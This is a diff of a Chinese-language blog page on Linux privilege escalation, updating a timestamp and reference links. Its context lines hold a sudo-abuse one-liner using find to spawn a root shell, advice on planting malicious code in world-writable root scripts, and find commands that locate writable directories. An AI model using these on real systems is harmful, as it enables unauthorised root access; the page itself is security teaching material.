@@ -119,7 +119,7 @@
 <meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/sudoabuse.png">
 <meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/find.png">
 <meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/linuxkernalexploit.png">
-<meta property="og:updated_time" content="2018-12-05T01:54:49.614Z">
+<meta property="og:updated_time" content="2018-12-14T09:57:59.224Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="linux权限提升">
 <meta name="twitter:description" content="Brief 当我们获取到一个低权限的shell的时候，我们往往需要提升我们的权限，以方便后面任意读写任意文件、权限维持等操作。 这篇文章中我们主要介绍一些常见的linux的权限提升的技巧，这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11">
@@ -474,7 +474,7 @@
 <li>find <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo find /home -exec sh -i \;</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="/2017/10/10/linux权限提升/find.png" alt=""><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">更多参考</a></p>
+<p><img src="/2017/10/10/linux权限提升/find.png" alt=""><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">how-i-got-root-with-sudo</a><br><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" target="_blank" rel="external">Linux Restricted Shell Bypass</a></p>
 <h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2><ul>
 <li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。其中最常见的是计划任务脚本。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
 </li>
